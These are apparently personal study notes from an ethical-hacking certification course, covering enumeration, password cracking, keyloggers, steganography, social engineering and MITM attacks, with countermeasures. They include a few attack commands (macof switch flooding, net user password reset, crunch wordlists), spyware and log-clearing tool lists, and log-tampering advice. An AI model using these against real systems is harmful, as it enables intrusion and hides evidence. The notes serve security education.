+Video 22:
+================
+WHATA IS SMTP:
+-----------------
+-SMTP stands for Simple Mail Trasfer Protocol and it is designed for electronic mail(E-mail)
+transmissions. SMTP is based on client-server architecture and works on Transmission control
+Protocol(TCP) on well-known port number 25.SMTP uses Mail Exchange(MX) servers to send the mail
+to via the Domain Name Service, however,should an MX server not detected; 
+SMTP will revert and try an A or alternatively SRV records.
+
+SMTP DEEP SCANNING:
+----------------
+SMTP provides three built-in commands
+-VRFY - validate users on the SMTP servers
+-EXPN - Delivery addresses of aliases and mailing lists
+-RCPTTO- Defines the recipients of the message
+- SMTP servers respond differently to the commands mentioned above, and SMTP enumeration
+is possible due to varied responses. Attackers can determine the valid users on the SMTP
+servers with the same technique.
+
+SMTP SCANNING TOOLS-
+--------------------------
+THE following table shows the list of tools to perform SMTP Enumeration
+01 	NetScan Tools Pro	http://www.netscantools.com/nstpromain.html
+02 	SMTP User Enum		http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
+
+SMTP DEEP SCANNING COUNTERMEASURES:
+---------------------------------------
+the following are the security controls to prevent SMTP enumeration attacks - 
+- Ignore email responses from unknown recipients
+- Disable open relay functionality
+- Prune any sensitive information like mail server and localhosts in the mail responses
+
+DNS (DOMAIN NAME SERVICE) - PORT 53
+---------------------------------------
+- DNS stands for Domain Name Service, and it is primarily designed as hierarchical decentralized
+destributed naming systems for computers, services, or any resource connected to the n/w
+DNS resolves hostnames to its respective IP address and vice versa. DNS internally maintains a
+database for storing the records.
+
+Following are the most commonly used record types in DNS -
+-Start of Authority (SOA)
+-IP addresses (A and AAAA)
+-SMTP mail exchangers (MX)
+-Nameservers(NS)
+-Pointers for reverse DNS lookups (PTR) and
+- Domain name aliases (CNAME)
+
+DNS (DOMAIN NAME SERVICE) DEEP SCANNING - PORT 53
+----------------------------------------------------
+DNS Enumeration:
+- DNS enumeration is possible by sending zone transfer request to the DNS primary server 
+pretending to be a client. it reveals sensitive domain records in response to the request
+-DNS works on both UDP and TCP on well-known port number 53. It uses UDP for resolving
+queries and TCP for zone transfers. DNS zone transfer allows DNS DB to replicate the 
+portion of the DB from primary server to the secondary server. DNS zone transfer must
+only be allowed by other validated secondary DNS servers acting as clients
+
+DNS (DOMAIN NAME SERVICE) DEEP SCANNING TOOLS -PORT-53
+----------------------------------------------------
+The following table shows the list of tools to perform DNS Enumeration
+
+01	nslookup	https://centralops.net/co/
+02	DNS Dumpster	https://dnsdumpster.com/
+03	DNS Recon	http://tools.kali.org/information-gathering/dnsrecon
+
+DNS (DOMAIN NAME SERVICE) DEEP SCANNING COUNTERMEASURES
+-------------------------------------------------------
+DNS Security controls:
+----------
+The following are the security controls to prevent DNS enumeration attacks - 
+-Configure DNS servers not to send DNS zone transfers to unauthenticated hosts.
+-Ensure DNS zone transfer do not contain HINFO information
+- Ensure to trim DNS zone files to prevent revealing unnecessary information
+
+WINDOWNS DEEP SCANNING:
+------------------------------
+- Windows OS can be enumerated with multiple tools from Sysinternals. Many
+more sysinternal tools can be downloaded from the following URL - 
+- https://technet.microsoft.com/en-in/sysinternals/bb645021.aspx
+
+Windowns DEEP SCANNING TOOLS:
+--------------------------------
+01 	PsExec		Execute processes on remote machine
+02	PsFile		Displays list of files opened remotely
+03 	PsgetSid	Translate SID to display name and vice versa
+04	PsKill		Kill processes on local or remote machine
+05	PsInfo		Displays installation, install date, kernel build.
+			physical memory, processors type and number etc
+06 	PsList		Displays process CPU, Memory, thread statistics
+07	PsLoggedOn	Displays local and remote logged users
+08	PsLogList	View Event Logs
+
+WINDOWNS SCANNING COUNTERMEASURES- 
+-------------------------------------
+THE follwing are the security controls to prevent windown enumeration attacks - 
+- Minimize the attack surface by removing any unnecessary or unused service
+- Ensure Windows Firewall is configured to restrict the access.
+
+UNIX/ LINUX DEEP SCANNING -
+-----------------------------
+UNIX or linux OS can be enumerated with multiple command line utilities
+provided by the OS. Below is the list of utilities.
+01	finger		Enumerate users on remote machine
+02	rpcinfo		Enumerate Remote procedure call
+03	rpcclient	Enumerate Usernames on Linux
+04	showmount	Enumerate  list of shared directories
+05	Enum4Linux	https://labs.portcullis.co.uk/tools/enum4linux/
+
+Linux Security Controls:
+The following are the security controls to prevent Linux enumeration attacks - 
+- Minimize the attack surface by removing any unnecessary or unused service
+- Ensure IPTables is configured to restrict the access
+
+Video 23:
+===============
+Enumerator
+Hyena - used to manage system in N/w, used by sys admins
+NetBIOS Enumerator - used to NetBIOS of your PC
+superScan - good tool for enumerator
+
+Video 24:
+=============
+SNMP Enumerator:
+----------------
+SoftPerfect Scanner
+
+Video 25:
+==============
+Hacking System part 1:
+-------------------------
+GOALS: SYSTEM HACKING-
+----------------
+-Gaining Access	-Bypass control of Systems.
+-Escalating Privileges	- Acquire rights of another user
+-Executing Applications - To create and maintain remote access
+-Hiding Files  -- Hide Malicious files inside System
+-Converting Tracks  - To hide the evidence
+
+PASSWORD CRACKING - 
+---------------------
+-Dictionary - A file of words is run against user accounts, and if the password is a simple word,
+it can be found pretty quickly.
+-Hybrid - A common method utilized by users to change passwords is to add a number or symbol to the end.
+A hybrid attack works like a dictionary attack, but adds simple numbers or symbols to the password attempt.
+-Brute force - The most time-consuming, but comrehensive way to crack a PW. Every
+combination of character is tried until the password is broken.
+
+ACTIVE ONLINE ATTACK - TROJAN/SPYWARE/KEYLOGGER
+------------------------------------------------
+- Attackers installs Trojan, spyware, key logger on victims system to get remote connecction with victime system.
+- Trojan, Spyware, Keyloggers runs in the background and send credentials to attacker and Victim doesn't know anything running in the system.
+
+ROOTKIT - (GATHER PASSWORDS FROM SYSTEM)
+-----------------------------------------
+In notes:
+
+PASSIVE ONLINE ATTACK-
+--------------
+- MAN IN THE MIDDLE ATTACK
+MITM -
+
+PASSWORD RECOVERY S/W
+---------------------------
+ELCOMSOFT DISTRIBUTED PASSWORD RECOVERY TOOL - 
+
+Video 26:
+======================
+HOW WINDOWNS GIVES YOU LOGIN??
+-------------------------------
+The Security Account Manager(SAM). often security Account Manager, is a DB
+file in Windows XP, Windows Vista,Windows 7 that stores users PW. it can be used
+to authenticate local and remote users. Beginning with Windows 2000 SP4, Active Directory
+authenticates remote users. SAM uses cryptographic measures to prevent unauthenticated
+users accessing the system.
+
+c:\windows\system32\config\SAM   -- which contains UN and PW
+
+WHAT IS PASSWORD SALTING:
+-----------------------------
+In cryptography, a salt is random data that is used as an additional input to a one-way function that "hashes" a 
+password or passphrase. Salts are closely related to the concept on nonce.
+
+PASSWORD CRACKING TOOLS-
+--------------------------
+Ophcrack and Lophtcrack-   used to copy the info of SAM files
+
+
+PASSWORD CRACKING TOOL FOR MOBILE -
+----------------------------------------
+- FLEXISPY PASSWORD GRABBER
+- It is used to crack passwords of mobiles
+
+Video 27:
+===========
+PRIVILEGE ESCALATION -
+--------------------------
+- Privilege escalation is the act of exploiting a bug. desing flaw or configuration oversight in an
+os or s/w application to gain elevated access to resources that are
+normally protected from an application or user. The result is that an application with more
+privileges that intended by the application developer or system administrator can perform
+unauthorized actions.
+
+- Type of Privilege Escalation - 
+ - Vertical Privilege Escalation
+ - Horizontal Privilege Escalation
+
+RESETTING PASSWORDS FROM CMD - 
+-----------------------------------
+-  A hacker can reset the password from command prompt. Commands are follows - 
+- Commands - 
+ - Net user : Get the admin name of the system
+ - Net user username * : Reset password of system
+
+EXECUTING APPLICATION:
+----------------------
+- Hackers executes malicious application in the victim's system
+- After Execution of Application, A hacker can get backdoor access to victim's System.
+- Examples of executing application - 
+ - Trojans
+ - Spywares
+ - Backdoors
+ - Crackers
+ - Bot
+
+KEYLOGGER:
+---------------
+- Keystroke logging, often referred to as keylogging or keyboard capturing, is the action
+of recording(logging) the keys struck on a keyboard, typically covertly, so that the person 
+using the keyboard is unaware that their actions are being monitored. Keylogging can also be
+used to study human - computer interaction. Numberous keylogging methods exist: they range
+from h/w and s/w based approaches to acoustic analysis.
+- There are 2 types of key loggers - 
+ - S/w key logger
+ - HW key logger
+
+KEYLOGGER TOOLS:
+---------------------
+Keyloggers for windows - 
+ - All in one keylogger
+ - Ardamax Keylogger
+
+Keyloggers for Mac - 
+ - Amac keylogger
+ - Mac Log Manager
+
+
+Video 28:
+----------------
+SPYWARE:
+--------------
+- Spywares are programs that's reads user interaction with computer and sends them to hacker remotely.
+- This is similar to key logger or Trojan but the main feature of spyware is, it hides itself in system.
+-It allows attackers to gather information about the target secretly such as email addresses,  user logins,
+ credit card numbers, banking credentials.
+
+SPYWARE S/W
+---------------
+-Spyware SpyAgent
+- Power Spy 2014
+- NetVizor
+- Remote Desktop Spy
+- SPECTOR PRO
+- Activity Monitor
+- Net Nanny
+
+STEGANOGRAPHY:
+--------------------
+- Steganography is the art and science of hidding information by embedding messages within 
+other, seemingly harmless images or other types of media.
+
+--Notes:---
+
+STAGANOGRAPHY TOOLS FOR SYSTEM - 
+---------------------------------
+STEGANOGRAPHY DEFINEDl
+------------------
+- The word steganography comes from the Greek 'steganos', meaning covered or secret,
+and 'graphy', meaning writing or drawing.
+Therefore, steganography literally means-
+"covered writing"
+- Image Steganography - 
+ - QuickStego
+-Audio Steganography - 
+ - DeepSound
+- Video Steganography - 
+ - OmniHide pro
+ - Masker
+-Document Steganography - 
+- wbstego
+
+STEGANOGRAPHY TOOLS FOR MOBILE:
+---------------------------------
+- Steganography Master
+- Stegais
+- SPY Pix
+- Pocket Stego
+- Secret Letter
+- Da Vinci Secret Message
+- StegDroid Alpha
+- Steg-o-matic
+
+STEGANALYSIS -
+------------------
+- It is a art of discovering and rendering covert messages from steganography.
+
+-Steganography Detection Tool-
+---------------
+ - GarGoyle Investigator Forensic Pro ****
+ - Stego Suite
+ - Stegdetect
+ - StegSpy
+ - ImgStegano
+ - Steganography Studio
+
+Video 29:
+===================
+COVERING TACKS-
+----------------
+Deleting Evidence:
+--------
+A common delusion amoung persons who count on commercial disk cleaners or privacy protection tools to 
+delete some data they do not want others to see is the belief that these tools remove everything from the hard disc once and for all.
+In fact, they can clean up the following kind of information:
+ - Cache and history for popular Web browsers
+ - Chat logs produced by Skype and some other popular instant messages
+ - Provide "secure delete" option to wipe files
+ - Clean some (but almost never all) of the following: jumplists, thumbnails, registry items, Skype chatsysc, etc.
+
+LOG TEMPERING - 
+----------------------
+- In windonws-based computer systems, all of the log files are stored in the event viewer, easily
+findable via the "Search" bar. In almost all Linux and Unix OS the log files are
+located in the /var/log disrectory, and in MAC os one should open the Finder, 
+click "Go to Folder" in the Go menu, and type in /Library/Logs and press Enter to activate the 
+Log File Management which will display all log files
+
+on windows we have -  Event Viewer
+
+LOG TEMPERING - 
+--------------------
+- If administrators want to check for malicious activities within the system for which they are
+responsible, they simply examine the log files,. There are two kinds of log files: system generated
+and application genereated
+- When it comes to log manipulation, the attacker usually has two options. The first option is to 
+delete the log, and the second one is to alter its content, Deletion of log files and replacement
+of sys binaries with Trojan malware ensures that the securtiy staff employed by the 
+targeted company will not detect evidence of the cyber intrusion
+
+CLEARING LOGS S/W
+-----------------
+-CCleaner
+-MRU-Blaster
+-Wipe
+-ClearProg
+-BleachBit
+-Privacy Eraser
+-Clear My History
+
+Video 30:
+==================
+Hacking Systems Practical1:
+-----------
+ophcrack (tool)- to extract info from SAM file  *** for CEH exam
+
+QickStego:  -- part of Steganography(to hide info in the image)
+-------
+
+Video 31:  **** (Main practical of system hacking) *****
+==============
+metasploit -- tool on Kali
+
+Using Measploit DB to hack Vunlarable windows
+where we can get access of Target PC by hacking it via Kali linux
+
+
+Video 32:  ****
+=================
+Creating dictionary in Kali linux
+
+crunch - 
+>crunch 1 5 sunil -o /root/Desktop/sunil.txt
+
+Video 33:
+==============
+Social Engineering-
+-----------
+WHAT IS SOCIAL ENGINEERING - 
+-----------------------------
+- Social engineering, in the context of information security, refers to psychological
+manipulation of people into performing actions or divulging confidential information. A type of
+confidence trick for the purpose of information gathering, fraude, or system access, it differs
+from a traditional "con" in that it is often one of many steps in a more complex fraud scheme
+
+- manupulation of other persons verbally
+
+TECHNIQUES OF SOCIAL ENGINEERING-
+-----------------------------------
+- Pretexing(adj. pretextual), also known in the UK as blagging or bohoing, is the act of creating and using an
+invented scenario(the pretext) to engage a targeted victim in a manner that increases the chance the victim
+will divulge information or perform actiions that would be unlikely in ordinary circumstances. An elaborate lie, it
+most often involves some prior research or setup and the use of this informaiton for impersonation(eg, date of birth,
+Social Security number, last bill amount) to establish legitimacy in the mind of the target
+- This techinque can be used to fool a business into disclosing customer information as well as by private
+investigators to obtain telephone records, utility records, banking records and other information directly from 
+company service representatives. The information ca then be used to establish even greater legitimacy under
+tougher questioning with a manager, eg, to make account changes, get specific balances, etc.
+- Pretexting can also be used to impersonate co-workers, police, bank ,tax authorities, cleargy, insurance
+investigators --or any other individual who could have perceived authority or tight-to-know in the mind of the 
+targeted victim. The pretexter must simply prepare answers to questions that might be asked by the victim, In
+some cases, all that is needed is a voice that sounds authoritative, an earnest tone, and an ability to think on one's feet to create a pretextual scenario.
+
+TECHNIQUES OF SOCIAL ENGINEERING:
+---------------------------------
+Phishing:
+------
+Phishing is a techique of fradulently obtaining private infromation. Typically, the pisher sends an e-mail that
+appears to come from a legitimate business-a bank,or credit card company--requensting "verification" of
+information and warning of some dire consequence if it is not provided. The email usually contains a link to a
+fraudulent webpage that seems legitimate -- with company logos and content--and has a form requesting
+everything from a home address to an ATM card's PIN or a credit card number. For example, in 2003, there was a 
+phishing scam in which users received emails supposedly from eBay claiming that the user's account was about to 
+be suspended unless a link provided was clicked to update a credit card(information that the genuine eBay
+already had). Because it is relatively simple to make a Web site resemble a legitimate organizations site by 
+mimicking the HTML code and logos the scam counted on people being tricked into thinking they were being
+contacted by eBay and subsequently, were going to eBay's site to update their account information. by spamming
+large groups of people, the "phisher" counted on the email being read by a percentage of people who already had 
+listed credit card numbers with eBay legiimately,ho might respond.
+
+Tailgating:
+---------------
+-An attacker, seeking entry to a restricted area secure by unattened , electronic access
+control, eg. by RFID card, simply walks in behind a person who has legitimate access. Following
+common courtesy, the legitimate person will usually hold the door open for the attacker or
+the attackers themselves may ask the employee to hold it open for them. The legitimate person 
+may fial to ask for identification for any of several reasons, or may accept an assertion that the 
+attacker has forgotten or lost the appropriate identity token. The attacker may also fake the 
+action of presenting an identity token.
+
+Spare phishing
+-------------------
+-Although similar to "phishing", spare phishing is a techinque that fraudulently obtains private
+information by sending highly customized emails to few end users. It is the main difference
+b/w phising attaks because phishing campaigns focus on sending out high volumes of 
+generalized emials with the expectation that only a few people will respond. On the other
+hand, spear pising emails require the attaker to perform additional research on their targets
+in order to "trick" end users into perfoming requested activities. the success rate of spear
+phishing attacks is considerable higher than phishing attacks with people opening roughly 3% of
+phishing emails when compared to roughly 70% of potential attempts. However, when users
+actually open the emails phishing emails have a relatively modest 5% success rate to have the 
+link or attachment clicked when compared to a spear-phishing attack's 50% success rate
+
+Video 34:
+=====================
+SOCIAL ENGINERRING 2:
+---------------
+PHASES IN SOCIAL ENGINEERING-
+----------------------------
+- phases in a social engineering attack
+- A social engineering attack is a contiunous process that starts with initial research, which is the starting phase, until its
+completion when the social engineer ends the conversion. The onversion is a brief converage of the four phases
+that that social engineer follows to perform an attack.
+-Research
+- 	In the research phase, the attacker tries to gather information about the target company. The information about the 
+	target can be collected from various resources and means, such as dumpster diving, the company's website, public
+	documents, physical interactions, and so on. Research is necessary when targeting a single user.
+-Hook
+-	In this phase the attacker makes the initial move by trying to start a conversation with the selected target after the
+	completion of the research phase.
+-Play
+ 	The main purpose of this step is to make the relationship stronger and continue the dialog to exploit the relationship
+	and get the desired information for which the communication was initiated.
+-Exit
+  	This is the last phase of the social engineering attack, in which the social engineer walks out of the attack scene or
+ 	stops the communicaiton with the target without creting a scene or doing anything that will make the target
+	suspicious.
+
+
+TYPES OF SOCIAL ENGINEERING:
+-----------------------------
+- Human Based Social Engineering
+- Computer Based Social Engineering
+- Mobile Based Social Engineering
+
+Computer Based Social Engineering:
+---------------------
+- Computer based social engineering attacks may include the below - 
+ - Email attachments
+ - Fake websites
+ - Pop-up windows
+
+Video 35:
+==============
+Social engineering part-3
+---------
+TYPES OF SOCIAL ENGINEERING:
+---------------------------
+There are two common classifications of social engineering:
+- Internal: In this type of attack , someone from inside the business has found a vulnerability and 
+  decided to take advantage. He or she may use the access to email lists and employee addresses
+  to send out an email prompting users to engage in a call to action containing malicious
+  s/w
+- External:This is when an outside source, perhaps a competitor or criminal hacker, wants to 
+  gain acess to your data, so they employ similar tactics as the internal threat using information
+  gathered off a public site
+
+INSIDER THREAT - 
+--------------------
+Insider Threat:
+-----------------
+ - Intentional: This occurs when anyone who has or has had access to a company's n/w uses
+   this access for malicious purposes. This can mean that the confidentiality of records was
+   compromised, data was stolen or financial damage was done.
+ - Unintentional: Like intentional insider threat, this type of cyberthreat is the fault of a company's
+   employee. However, unintentional insider threats are unplanned. The individuals involved were
+   usually socially engineered into allowing a bad actor to have access to the n/w
+
+CONTRIBUTING FACTORS IN SOCIAL ENGINEERING VULNERABILITY
+----------------------------------------------------------------------
+- Security sys, policies, and practices. Many of the cases that we examined provided
+  insight into organizational policies and procedures. Some cases indicated that the victims
+  violated those policies, but most incident summaries do not provide sufficient information to 
+  determine whether those factors are involved.
+- Management and management sys, Many of the cases reveal that simple
+ authentication credentials provide attackers with access to internal email, company data, and 
+entire computer n/w. In one case that we examined, an attacker gained direct n/w
+access from a UN-PW combination and did not need to place malware or execute
+any other indirect attack to cause damage. Organizations must regularly perform extensive
+security audits to determine how best to improve internal controls; they cannot rely on 
+security established during initial installation of a sys.
+- Job pressure. Certain industries, such as news services, place a premium on obtaining and 
+distributing information as quickly as possible. Employees in these type of organizations may
+be more susceptible to outside influence from social engineering due to this pressure.
+
+THE HUMAN FACTORES THAT WE IDENTIFIED ARE AS FOLLOWS:
+--------------------------------------------------------
+- Attention. In at least one of the cases we examined, we identified fatigue as a contributing factor.
+In that case, a phishing message was received late at night, and the individual responded before
+taking the time to analyze the message. The attacker may have informationn about work hours that
+could be used as part of an orgaized attack.
+- Knowledge and memory. Several cases that we examined indicated that even when employees
+have been trained, a large percentage will still respond to phishing attacks. it is therefore important
+that organizaions offer constant refreshers or other means to maintain emplyee knowledge and 
+keep it fresh in their minds.
+-Reasoning and judgement. in some cases an emplyee's safeguards were lowered , perhaps in 
+response to the realistic nature of a phishing message and/or the pretext created through reverse
+social engineering(Eg, offers to organizations or emplyees to assist in reventing or addressing
+outside attacks, in solving bank account problems, or in supporting system operations)
+-Stress and anxiety. In one case, the victim knew that the organization and its customers were
+receiving phishing emails. This knowledge may have increased his desire to accept an offer of
+mitigation that appeared to be legitimate, but in actuality was just another phishing attack.
+
+BEST PACTICES FOR ORGANIZATIONS:
+--------------------------------
+- Training. Organizations must cotinue to develop and deploy effective training and awareness
+programs so that staff members are aware of social engineering scams and can identify
+deceptive practices and phishing cues. Training plans should also teach effective coping and
+incident management behaviors to respond to social engineering.
+- Minimize stress. When employees are stressed and working fast, they tend to be more
+susceptible to social engineering attempts. Organizational leaders need to examine whether
+they are creating a stressful environment or one that fosters a natural workflow. For ex,
+one aspect of a plan to minimize stress could involve allocating time for employees to fulfill
+information security compliance requirements.
+- Encourage emplyees to monitor and limit information posted on networking
+sites. For example. Linkedin members often post details about their career history, including
+past cities where they have lived and worked. Phishers and spear phishers often contract
+individuals based on the information posted on such sites. They advertise fals jobs and ask
+recipients to send a writing sample, building a sense of trust.
+
+Video 36:
+============
+Social Engineering 4:
+-----------
+TOP METHODOLOGIES:
+---------------------
+We have broken down malicious social engineering into three top methodologies:
+- Phishing: The practice of sending emails appearing to be from reputable sources with the goal 
+  of influencing or gaining personal information.
+- Vishing: The practice of eliciting information or attempting to influence action via the telephone,
+  may include such tools as phone spoofing.
+- Impersonation: The practice of retexting as another person with the goal of obtaining
+  information or access to a person, company, or computer system.
+
+WHO IS BEST SOCIAL ENGINEER IN WORLD??
+---------------------------------------
+KEVIN D MITNIK-
+------------------
+Kevin David Mitnick - (born Aug 6, 1963) is an American computer security consultant,
+author and hacker, best known for his high-profile 1995 arrest and latest five years in prison for 
+various computer and communicaions-related crimes.
+
+has own sight - mitnicksecurity.com
+
+Video 37:
+===========
+Social Engineering:
+---------------------
+netcraft -- block phishing sites(browser addon)
+
+Video 38: - -not required
+===============
+biggest hacker - Kevin D Mitnick
+Book - art of disception
+
+Video 39:
+===============
+MITM 1: Man in middle attack
+---------
+WHAT IS MITM?
+-------------------
+- MITM is the act of capturing data as it is transferred over a n/w. The data can then be
+recorded and used for reconnaissance(information gethoring), or used in an attack. An ethical hacker is a person who
+attacks an organizations security on behalf of its owners in order to discover vulnerabilities.
+
+TYPES OF SNIFFING/MITM ATTACK - 
+-----------------------------------
+-There are 2 type of Sniffing attack-
+ - Active Attack
+ - Passive Attack
+
+Active MITM - 
+----------------
+- When sniffing is performed on a switched n/w, it is known as active sniffing.
+- Active sniffing relies on injecting packets into the n/w that cause traffic. Active sniffing is
+ required to bypass the segmentation that switches provided. Switch maintain their own Arp
+cache special type of memory known as content adressable Memory (CAM), keeping track of
+which host is connected to which port.
+- Sniffing are operated at the Data Link Layer of OSI model. This means that they do not have to 
+play by the same rules as appliation and services that resides further up stack. Sniffer can grab
+whatever they see on the wire and record it for later review, They allow the user to see all the 
+data contained in packet, even information that should remain hidden
+
+PASSIVE MITM:
+----------------
+- Hubs see all the traffic in the particular collision domain. Sniffing performed on a hub is know as passive sniffing.
+- Passive sniffing is performed when the use is on a hub. Because the user is on a hub, all traffic is 
+sen to all ports. All the attacker must do is to start the sniffer and just wait for someone on
+the same collision domain to start sending or receiving data. Collision domain is a logical area
+of the same collision domain to start sending or receiving data. Collision domain is a logical
+area of the n/w in which one or more data packets can collide with each other.
+
+PROTOCOLS WHICH ARE VULNERABLE TO MITM-
+-------------------------------------------
+-Telnet and rlogin(remote login): Using these protocols anyon can access your keystrokes and
+some tools helps to see what a victim is viewing on his computer
+-HTTP: It is the basic protocol and it has many vulnerabilities. This protocol sends usernames and 
+pw in clear test which helps anyone to view them.
+- SNMP: this is like HTTP sends pw in clear texts. All most all protocols has same issue
+-POP: Send pw in clear text
+-FTP: sends pw in clear text
+-NNTP: Sends pw in clear text
+-IMAP: Sends pw in clear text
+
+Video 40:
+==================
+MITM -2
+----------
+MAC ADDRESS ATTACK - 
+-----------------------
+- In computer n/w, a media access control attack or MAC flooding is a techinque
+employed to compromise the security of nw switches. The attack works by forcing
+legitimate MAC table contents out of the switch and forcing a unicast flooding behavior
+potentially sending sensitive information to portions of the nw where it is not normally
+intneded to go.
+
+METHOD FOR MAC FLOODING-
+-----------------------------
+- Switches maintain a MAC table that maps individual MAC address on the nw to the 
+physical ports on the switch. THis allows the switch to direct data out of the physical port
+where the recipient is located, as opposed to indiscriminately broadcasting the data out of all
+ports as a hub does. The advantage of this method is that data is bridged exclusively to the 
+n/w segment containing the computer that the data is specifically destined for.
+- In a typical MAC flooding attack, a swithc is fed many Ethernet frames, each containing different
+source MAC addresses, by the attacker. The intention is to consume the limited memory set 
+aside in the switch to store the MAC address table.
+
+COUNTERMEASURES FOR MAC FLOOD-
+----------------------------------
+- with a feature often called "port security" by vendors, many advanced switches can be configured
+to limit the number of MAC addresses that can be learned on ports connected to end stations A
+smaller table of "secure" MAC addresses is maintained in addition to (and as a subset to) the 
+traditional "MAC address table".
+-Many vendors allow discovered MAC addresses to be authenticated against an authentication,
+authorization and accounting(AAA) server and subsequently filtered.
+-Implementations of IEEE802.1x suites often allow packet filtering rules to be installed explicity by
+an AAA server based on dynamically learned informaiton about clients, including the MAC address.
+-Security features to prevent ARP spoofing or IP address spoofing in some cases may also perform
+additional MAC address filtering on unicast packets, however this is an implementation-dependent
+side-effect.
+-Additional security measures are sometimes applied along with the above to prevent normal unicast
+flooding for unknown MAC addresses. This feature usually relies on hte "port security" feature to 
+retain all "secure" MAC addresses for at least as long as they remain in the ARP table of layer 3
+devices. Hence the aging time of learned "secure" MAC addresses is separately adjustable. This
+feature prevents packets from flooding under normal operational circumstances , as well as
+mitigatting the effects of a MAC flood attack.
+
+MAC FLOODING USING "MACOF"
+-------------------------------
+-Macof can flood a switch with random MAC addresses. This is called flooding. This fills in
+the switch's CAM able, thus new MAC addresses can not be saved, and the switch starts to 
+send all packets to all ports, so it starts to act as a hub, and thus we can monitor all traffic 
+passing through it.
+
+Command - macof -i eth0
+
+macof -i eth0 -n 15
+
+DHCP (DYNAMIC HOST CONFIGURATION PROTOCOL)-
+----------------------------------------------
+- Another type of nw attack which is targeted to DHCP servers is known as DHCP
+starvation attack. In a DHCP starvation attack, an attacker broadcasts large no. of DHCP
+REQUEST messages with spoofed source MAC addresses. If the legitimate DHCP server in 
+the nw start responding to all these bogus DHCP REQUEST messages, available IP
+Addresses in the DHCP server scope will be depleted within a very short span of time
+
+Video 41:
+----------------
+MITM -3:
+-------------
+ARP - (ADDRESS RESOLUTION PROTOCOL)
+-----------------------------
+- What is ARP Spoofing?
+- ARP spoofing is a type of attack in which a malicious actor sends falsified ARP(address
+Resolution Protocol) messages over a local area nw . This results in the linking of an
+attacker's MAC address with the IP address of a legitimate computer or server on the
+nw. Once the attackers MAC address is connected to an authentic IP address, the 
+attacker will begin receiving any data that is intended for that IP address. ARP spoofing can
+enable malicious parties to intercept, modify or even stop data in-transit. ARP spoofing attacks
+can only occur on local area nw that utilize the Address Resolution Protocol.
+
+ARP SPOOFING ATTACKS-
+--------------------------
+- The effect of ARP spoofing attacks can have serious implications for enterprises. In their most
+basic application, ARP spoofing attacks are used to stel sensitive information. Beyond this, ARP
+spoofing attacks are often used to facilitate other attacks such as:
+- Denial-of service attack: DoS attacks often leverage ARP spoofing to link multiple IP addresses
+with a single target's MAC address. As a result, traffic that is intended for many different IP
+addresses will be redirected to the target's MAC address, overloading the target with traffic.
+- Session hijacking: Session hijacking attacks can use ARP spoofing to steal session IDs, granting
+attackers access to private systems and data.
+- Man-in-the-middle attacks: MITM attacks can rely on ARP spoofing to intercept and modify
+traffic b/w victims.
+
+ARP SPOOFING PROCEDURE:
+-----------------------------
+ARP spoofing attacks typically follow a similar progression. The steps to an ARP spoofing attack
+usually include - 
+- The attacker opens an ARP spoofing tool and sets the sets the tools IP address to match the IP subnet
+of a target. ex of popular ARP spoofing s/w include ARPspoof, Cain & Abel,
+Arpoison and Ettercap
+-The attacker uses the ARP spoofing tool to scan for the IP and MAC addresses of hosts in the 
+targets subnet
+- The attacker chooses its target and begins sending ARP packets across the LAN that contain
+the attackers MAC address and the target's IP address.
+- As other hosts on the LAN cache the spoofed ARP packets, data that those hosts send to the 
+victim will go to the attacker instead. From here, the attacker can steal data or launch a more
+sophisticated follow-up attack.
+
+ARP SPOOFING DETECTION:
+----------------------------
+- The following methods are recommended measures for detecting, preventing and protecting against
+ARP spoofing attacks:
+- Packet filtering: Packet filters inspect packets as they are transmitted across a nw. Packet filters
+are useful in ARP spoofing prevention becuase they are capable of filtering out and blocking packets
+with conflicting source address information (packets from outside the nw that show source
+addresses from inside the nw and vice-versa)
+- Avoid trust relationships: Organizations should develop protocols that rely on trust relationships as 
+little as possible. Trust relationships rely only on IP addresses for authenitication, making it 
+significantly easier for attackers to run ARP spoofing attacks when they are in place.
+- Use ARP spoofind detection sw: there are many programs available that help org
+detect ARP spoofing attacks. These programs work by inspecing and certifying data before it is 
+transmitted and blocking data that appears to be spoofed.
+- Use cryptographic nw protocols: Transport Layer Security(TLS), secure shell (SSH), HTTP
+Secure(HTTPS) and other secure communications protocols bolster ARP spoofing attack
+prevention by encrypting data prior to transmission and authenticationg data when it is received.
+
+ARP SPOOFING DETECTION TOOLS-
+------------------------------------
+XARP TOOL-
+
+Video 42:
+==============
+MITM - 4:
+--------------
+DNS CACHE POISONING - 
+----------------------
+- Cache poisoning is a type of attack in which corrupt  data is inserted into the cache DB of
+the Domain Name System(DNS) name server. The Domain Name system is a system that
+associates domain name with IP addresses. Devices that connect to the internet or other
+private Nw rely on the DNS for resolving URLs, email addresses and other human-
+readable domain names into their corresponding IP addresses. In a DNS cache poisoning
+attack, a malicious party sends forged responses from an imposter DNS in order to reroute a
+domain name to a new IP address. This new IP address is almost always for a server that is 
+controlled by the atttacker. DNS cache poisoning attaks are often used to spread computer
+worms and ohter malware. More sopisticated uses for DNS cache poisoning include man-in-the-middle attacks
+and denial-of service attacks
+
+CACHE POISONING ATTACKS-
+---------------------------
+- The success of a cache poisoning attack relies on the existence of exploitable vulnerabilities in
+DNS sw. once an attacker has sent a forged DNS response, the corrupt data provided
+by the attacker gets cached by the real DNS name server. It is ata this point that the DNS cache
+is considered "poisoned." As a result, future users that attempt to visit the corrupted domin
+will instead be routed to the new IP address selected by the attacker. Users will continue to 
+receive inauthentic IP addresses from the DNS untill hte poisoned cache has been cleared.
+- DNS cache poisoning attacks usually incorporate elements of social engineering to manipulate
+victims into downloading malware. The servers and websites that attackers use to replace
+authentic IP addresses are set up to appear legitimate while they actually contain malware in
+disguise. Attackers use of social engineering along with the fact that domain names still appear
+normal can make it very difficult for users to detect cache poisoning attacks. As a result, victims
+willingly download malicious content that they believe to be valid and from trusted sources.
+
+on windown sys also we can find cache
+sys32/driver/etc/hosts
+
+PREVNTION OF CACHE ATTACK
+---------------------------------
+-There are several measures that enterprises should take to prevent DNS cache poisoning attacks.
+For starters, IT teams should configure DNS servers to rely as little as possible on trust
+relationships with other DNS servers. Doing so will make it more difficult for attackers to use their
+own DNS servers to corrupt their targets servers. Beyond limiting trust relationships on the DNS, 
+IT teams should ensure that they're using the most recent version of DNS. Domain Name Systems 
+that use BIND 9.5.0 or higher include features such as port reandomization and cryptographically
+secure Transaction IDs, both of which help prevent cache poisoning attacks.
+
+In order to further prevent cache poisoning attacks, IT teams should configure their DNS name servers to:
+-----------------------------------------------------------------------------------------------------------
+- Limit recursive queries.
